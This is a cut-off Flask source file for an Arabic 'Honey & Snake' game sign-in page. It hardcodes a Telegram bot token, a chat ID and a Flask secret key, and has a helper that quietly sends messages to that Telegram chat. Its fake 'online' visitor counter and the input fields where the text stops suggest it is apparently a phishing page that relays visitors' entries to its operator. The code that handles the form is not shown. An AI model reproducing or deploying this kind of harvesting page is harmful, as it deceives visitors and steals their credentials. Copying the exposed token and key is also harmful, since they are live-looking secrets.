from flask import Flask, render_template_string, request, session
import requests

app = Flask(__name__)
app.secret_key = "honey_snake_master_key_2026"

# --- إعداداتك الخاصة (تأكد من صحتها) ---
BOT_TOKEN = "8342550502:AAFvUqf0i8OunS0MIsX_5S3R_E_SjU8v6W8"
CHAT_ID = "7299061036"
visitor_count = 1642  # يمكنك تغيير الرقم الابتدائي للعداد من هنا

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        requests.get(url, timeout=5)
    except:
        pass

# --- واجهة المستخدم الشاملة (HTML + CSS + JS) ---
INDEX_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Honey & Snake | العب الآن</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Changa:wght@400;700&display=swap');
        body { font-family: 'Changa', sans-serif; background: #fdfdfd; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; border: 1px solid #eee; }
        .visitor-badge { background: #fff3e0; color: #e65100; padding: 6px 18px; border-radius: 50px; font-size: 13px; font-weight: bold; margin-bottom: 20px; display: inline-block; border: 1px solid #ffe0b2; }
        .online-dot { height: 9px; width: 9px; background-color: #4caf50; border-radius: 50%; display: inline-block; margin-left: 8px; animation: blink 1.2s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
        .site-title { color: #ffab00; font-size: 34px; font-weight: 800; margin: 5px 0; letter-spacing: -1px; }
        .site-slogan { color: #888; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1.5px solid #eee; border-radius: 12px;
